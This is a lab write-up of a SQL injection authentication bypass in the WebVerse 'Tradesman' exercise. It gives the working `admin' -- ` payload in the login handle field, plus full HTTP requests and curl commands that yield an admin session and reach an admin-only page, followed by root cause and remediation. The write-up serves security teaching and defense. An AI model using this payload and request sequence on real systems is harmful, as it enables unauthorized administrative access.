---
title: "WebVerse Tradesman: SQL Injection Authentication Bypass to Platform Admin Access"
date: 2026-08-08T00:00:00+02:00
lastmod: 2026-08-13T00:00:00+02:00
draft: false
author: "Mdk22"
description: "A legacy seller login accepted SQL comment syntax in the handle field, bypassing password authentication and issuing a platform_admin session."
summary: "SQL syntax in the legacy seller login changed a normal rejection into an admin session. Caido and curl both reached the linked administrators-only notes page."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "Tradesman"
  - "SQL Injection"
  - "Authentication Bypass"
  - "Legacy Authentication"
  - "Caido"
  - "curl"
  - "CWE-89"
platform: "WebVerse"
lab: "Tradesman"
difficulty: "Easy"
showToc: true
TocOpen: false
case_id: "CASE-008"
case_status: "SOLVED / VERIFIED"
case_classification: "SQL Injection Authentication Bypass"
case_family: "server-side-injection"
case_evidence:
  - "Caido"
  - "curl"
case_verified: true
case_caido: true
case_independent_curl: true
primary_cwe: "CWE-89"
cwes:
  - "CWE-89"
patterns:
  - "SQL Injection"
  - "Sensitive Information Disclosure"
methods:
  - "Disclosed Route Follow-Up"
  - "Invalid-versus-Valid Differential"
  - "Quote Differential"
  - "Independent curl Verification"
---

> **Publication note:** This article documents a fresh reproduction in an authorized WebVerse educational lab. The temporary host, fixed invalid test password, reusable session values, local cookie-jar path, and private raw artifacts are excluded. The current lab objective is represented publicly as `WEBVERSE{REDACTED}`.

## Executive Summary

Tradesman exposed a legacy seller authentication flow at `POST /seller/login`. The public marketplace pointed to a separate seller surface, where the server-rendered form accepted `handle` and `password` fields. Normal invalid credentials returned HTTP 200 with the stable `Invalid handle or password` marker, while the protected dashboard redirected unauthenticated requests back to the login page.

A single apostrophe remained on the normal invalid-login path. Changing only the `handle` value to a structured SQL comment payload changed the behavior: the server returned HTTP 302 to `/seller/dashboard` and issued a new session cookie. Reusing that newly issued session loaded the dashboard with HTTP 200 and identified the active account as `admin` with the `platform_admin` role.

The same session reached `/seller/dashboard/admin-notes` from the dashboard. The page described the notes as internal and administrators-only, then returned the lab's integration-key flag. I repeated the full flow with `curl` and a fresh cookie jar, then stopped after the read-only flag was confirmed.

> **CONFIRMED FINDING**
>
> The seller login inserts `handle` into SQL. A targeted comment payload bypasses the password check for the tested `admin` account, and the server issues a session accepted as `platform_admin`.

## 1. Report Profile

| FIELD | VALUE |
| --- | --- |
| Platform | WebVerse |
| Lab | Tradesman |
| Difficulty | Easy |
| Status | Solved / Verified |
| Affected endpoint | `POST /seller/login` |
| Affected parameter | `handle` |
| Protected resource | `/seller/dashboard` |
| Objective resource | `/seller/dashboard/admin-notes` |
| Verified role | `admin` / `platform_admin` |
| Primary weakness | CWE-89: SQL Injection |
| Evidence | Fresh Caido reproduction and `curl` verification |

### Verified Attack Chain

```text
GET /seller/login
  > server-rendered form with handle and password fields
Invalid credentials
  > HTTP 200, "Invalid handle or password"
GET /seller/dashboard without an authenticated session
  > HTTP 302 to /seller/login
Single-quote control in handle
  > HTTP 200, normal invalid-login marker
SQLi test: handle=admin' -- <trailing space>
  > HTTP 302 to /seller/dashboard
  > Set-Cookie: session=<REDACTED>
Reuse only the newly issued session
  > HTTP 200, admin / platform_admin
GET /seller/dashboard/admin-notes
  > HTTP 200, administrators-only notes
  > WEBVERSE{REDACTED}
Independent curl reproduction
  > fresh cookie jar reaches the same protected resource
```

## 2. Scope and Evidence Boundary

The reproduction was limited to the intentionally vulnerable Tradesman lab and the seller login, protected dashboard, and dashboard-linked read-only notes route. Historical material supplied the expected route grammar and vulnerability theme only; dynamic responses, session state, and objective evidence were collected from the active instance.

- The password stayed on the same known-invalid test value while only `handle` changed.
- No database enumeration, extraction, write action, or unrelated dashboard functionality was tested.
- Session values are redacted and excluded from the public artifact.
- The published evidence supports the SQL injection, authenticated-session transition, role-bearing dashboard access, and the read-only objective. It does not claim source-code access, database-engine identification, or broader administrative capability.

Caido captured the main requests and responses. `curl` repeated the login and protected-page flow with a fresh cookie jar.

## 3. Step-by-Step Reproduction

This section keeps each request, payload, expected result, and screenshot beside the step where it was used. Caido is the main evidence source, while the final `curl` flow repeats the result with a fresh cookie jar. Temporary host, password, session, and flag values use public placeholders.

### 3.1 Seller Surface Discovery and Login Contract

The seller sign-in page provided the endpoint and field names directly rather than requiring an inferred request contract.

```html
<form method="post" action="/seller/login" autocomplete="off">
  <input type="text" id="handle" name="handle" required>
  <input type="password" id="password" name="password" required>
  <button type="submit">Sign in</button>
</form>
```

![Seller login HTML showing POST /seller/login and handle and password input names](Tradesman_Figure_01_Caido_Login_Form.png)

**Figure 1: Login contract.** The active application accepts seller credentials through `POST /seller/login` using the exact `handle` and `password` fields.

### 3.2 Invalid Login Baseline

A known-invalid account recorded the normal rejection before any SQL syntax was added.

**P-01: Invalid handle.**

```text
invalid_user@example.local
```

**R-01: Invalid login request.**

```http
POST /seller/login HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

handle=invalid_user%40example.local&password=<REDACTED>
```

**Expected result:** HTTP 200 with the stable rejection marker and no authenticated dashboard state.

```html
<div class="form-error">Invalid handle or password</div>
```

![Invalid seller login response showing the Invalid handle or password marker](Tradesman_Figure_02_Caido_Invalid_Login.png)

**Figure 2: Invalid baseline.** Normal invalid credentials stay on the login page and return the same rejection marker each time.

### 3.3 Protected Dashboard Baseline

The target dashboard was requested without an authenticated session before exploitation.

**R-02: Unauthenticated dashboard request.**

```http
GET /seller/dashboard HTTP/1.1
Host: <LAB_HOST>
```

**Expected result:** HTTP 302 with `Location: /seller/login`.

![Unauthenticated seller dashboard request redirecting to /seller/login](Tradesman_Figure_03_Caido_Dashboard_Redirect.png)

**Figure 3: Protected route.** The dashboard is not anonymously accessible before the SQL login test.

### 3.4 Single-Quote Negative Control

The first mutation tested one SQL metacharacter while retaining the same known-invalid password and request contract.

**P-02: Lone apostrophe.**

```text
'
```

**R-03: Quote-control request.**

```http
POST /seller/login HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

handle='&password=<REDACTED>
```

**Expected result:** HTTP 200 with the same invalid-login marker. This does not prove or disprove SQL injection; it only shows that a quote alone does not authenticate the user.

![Lone-quote login control returning the normal invalid-login marker](Tradesman_Figure_04_Caido_Quote_Control.png)

**Figure 4: Quote control.** The metacharacter alone remains rejected, removing the simpler explanation that any parser anomaly or generic validation defect created the later privileged state.

### 3.5 SQL Injection Login Test

The request that confirmed the issue changed only `handle` to a SQL comment payload and kept the same invalid password. The trailing space after `--` is required by the payload.

**P-03: Verified authentication-bypass payload.**

```text
admin' --
```

**R-04: Login request with the SQL payload.**

```http
POST /seller/login HTTP/1.1
Host: <LAB_HOST>
Content-Type: application/x-www-form-urlencoded

handle=admin' -- &password=<REDACTED>
```

**Expected result:** a change from the normal rejection path to HTTP 302 with `Location: /seller/dashboard` and a newly issued session cookie. This transition is not final proof on its own.

![Caido request showing the admin SQL comment payload with sensitive values redacted](Tradesman_Figure_05_Caido_SQLi_Request.png)

**Figure 5: SQL payload request.** The route and password stay fixed; only `handle` changes. Any old Replay cookie is redacted and is not used as proof.

### 3.6 Server-Issued Authentication Transition

The server changed from the invalid-login response to a dashboard redirect and issued a new session cookie.

```http
HTTP/1.1 302 Found
Location: /seller/dashboard
Set-Cookie: session=<REDACTED>
```

![Caido response redirecting to the seller dashboard and issuing a redacted session cookie](Tradesman_Figure_06_Caido_SQLi_Response.png)

**Figure 6: Authentication transition.** The newly issued session is the boundary-crossing artifact; the redirect alone is not treated as sufficient confirmation.

### 3.7 Privileged Session Verification

Only the newly issued session was applied to the dashboard that previously redirected anonymous requests.

**R-05: Authenticated dashboard request.**

```http
GET /seller/dashboard HTTP/1.1
Host: <LAB_HOST>
Cookie: session=<SESSION_COOKIE>
```

**Expected result:** HTTP 200 with the authenticated account and role marker.

```text
Signed in as admin with role platform_admin
```

![Authenticated seller dashboard identifying the account as admin with the platform_admin role](Tradesman_Figure_07_Caido_Admin_Dashboard.png)

**Figure 7: Privileged dashboard.** The application accepts the new session as `admin` / `platform_admin` and exposes a direct navigation link to the admin-notes resource.

### 3.8 Administrators-Only Objective Readback

The same SQLi-issued session was used only for the dashboard-linked, read-only notes route.

**R-06: Administrators-only notes request.**

```http
GET /seller/dashboard/admin-notes HTTP/1.1
Host: <LAB_HOST>
Cookie: session=<SESSION_COOKIE>
```

**Expected result:** HTTP 200, explicit administrators-only context, and the current integration-key objective.

```text
Internal. Admins only. Notes here are visible to platform staff, never to sellers.
The current integration key is WEBVERSE{REDACTED}.
```

![Administrators-only notes response showing the integration-key objective redacted for publication](Tradesman_Figure_08_Caido_Admin_Notes_Redacted.png)

**Figure 8: Protected-page readback.** The resource confirms the admin role and returns the redacted lab flag. No other internal tool, write action, or unrelated data was accessed.

### 3.9 Repeating the Flow with curl

I repeated the login and protected-page request outside Caido so the result did not depend on Replay state or an existing browser session. Both commands used a fresh cookie jar. The public commands keep the method, path, headers, and body but replace temporary values with placeholders. Certificate bypass was not part of the test, so the unnecessary `-k` option is omitted.

**C-01: Fresh command-line authentication transition.**

```bash
curl -sS -i \
  -c <REDACTED> \
  --data-urlencode "handle=admin' -- " \
  --data-urlencode "password=<REDACTED>" \
  "https://<LAB_HOST>/seller/login"
```

**Expected result:** HTTP/2 302, `location: /seller/dashboard`, and `set-cookie: session=<REDACTED>`.

![curl login reproduction redirecting to the seller dashboard](Tradesman_Figure_09_Curl_SQLi_Login.png)

**Figure 9: `curl` login.** A fresh request outside Caido receives the same server-issued session.

**C-02: Fresh-cookie-jar objective readback.**

```bash
curl -sS -i \
  -b <REDACTED> \
  "https://<LAB_HOST>/seller/dashboard/admin-notes"
```

**Expected result:** HTTP/2 200, `admin` / `platform_admin` context, administrators-only content, and `WEBVERSE{REDACTED}`.

![curl readback of the administrators-only notes with the flag redacted](Tradesman_Figure_10_Curl_Admin_Notes_Redacted.png)

**Figure 10: `curl` readback.** The new session reaches the same administrators-only page and returns the redacted flag.

### 3.10 Final Result and Stop Point

The three requests have clear roles. P-01 records a normal rejection, P-02 shows that a quote alone does not log in, and P-03 changes only `handle` and creates a new session. The admin role, protected page, and repeated `curl` flow confirm the bypass. A payload string or status code alone would not be enough.

> **WHERE TESTING STOPPED**
>
> Testing stopped after the read-only flag was confirmed. I did not enumerate the database, extract unrelated data, perform writes, test other dashboard functions, or expand the exploit.

## 4. Root Cause and Classification

The runtime behavior is consistent with user-controlled `handle` data being incorporated into a legacy SQL authentication query without safe parameter binding. The exact query text and database engine were not observed, so the following is illustrative rather than captured source:

```sql
SELECT ...
FROM sellers
WHERE handle = '<handle>'
  AND password = '<password>';
```

With the SQL payload, the likely query effect is:

```sql
WHERE handle = 'admin' -- ...password condition...
```

The primary mapping is [CWE-89](https://cwe.mitre.org/data/definitions/89.html): attacker-controlled input changed SQL behavior at the authentication boundary. The observed authentication bypass and notes exposure are verified consequences of that injection path, not separate asserted root-cause CWEs.

## 5. False-Positive Controls

The conclusion uses several checks instead of one unusual response:

1. Invalid credentials produced HTTP 200 and the normal rejection marker.
2. The protected dashboard redirected to login before exploitation.
3. A lone apostrophe remained rejected.
4. Only the structured SQL comment mutation changed the flow to an authenticated redirect.
5. The new session was accepted by the previously protected dashboard.
6. The dashboard bound that session to `admin` / `platform_admin`.
7. The notes route stated that its contents were administrators-only.
8. A `curl` flow with a fresh cookie jar reproduced the privileged readback.

This confirms SQL injection and authentication bypass. I did not test source-code access, database writes, broad extraction, command execution, or other dashboard permissions.

## 6. Impact

The confirmed impact is a password bypass for the tested `admin` account. The server issues a `platform_admin` session that opens the protected dashboard and its linked administrators-only notes.

The confirmed lab impact is limited to reading the integration-key objective in that notes resource. The dashboard states that the account has access to internal platform tools, but no additional tool access, write actions, or unrelated data collection was tested. In a production environment, impact would depend on account privileges and the data exposed behind the affected authentication boundary.

## 7. Remediation

### Parameterize the Login Query

Use prepared statements or parameterized queries for every user-controlled value. The SQL statement must remain fixed while `handle` is supplied as data rather than concatenated query structure.

### Verify Passwords Separately

Select the account through a safely bound identifier, then verify the supplied password against a modern password hash such as Argon2id, bcrypt, or scrypt. Create an authenticated session only after the entire credential-verification path succeeds.

### Rotate the Exposed Integration Key

Rotate the key exposed in the administrators-only notes and invalidate the old value wherever it is referenced. Restrict sensitive operational values to a dedicated secret-management boundary where possible.

### Review Legacy Authentication Surfaces

Audit seller, vendor, staff, and back-office routes that survived frontend rewrites or migrations. Add regression tests for apostrophes, SQL comment syntax, and other metacharacters in authentication fields.

## 8. Validation After the Fix

- Invalid credentials should retain the rejection path and never issue an authenticated session.
- Apostrophes and SQL comment syntax should remain literal input rather than changing query structure.
- `/seller/dashboard` should redirect to login unless a genuine login has completed.
- No failed login path should create a session accepted as `admin` or `platform_admin`.
- The rotated integration key should no longer be valid in dependent systems.
- Automated tests should fail if future changes reintroduce string concatenation in authentication queries.

## Conclusion

Tradesman contains a classic SQL injection in a legacy login. A comment payload in `handle` turns a rejected login into a server-issued `admin` / `platform_admin` session. The invalid login, protected-page baseline, quote check, fresh session, explicit role marker, admin-only notes, and repeated `curl` flow all support the result.

The public result is recorded as `WEBVERSE{REDACTED}`. Testing stopped after the authorized, read-only objective was confirmed.
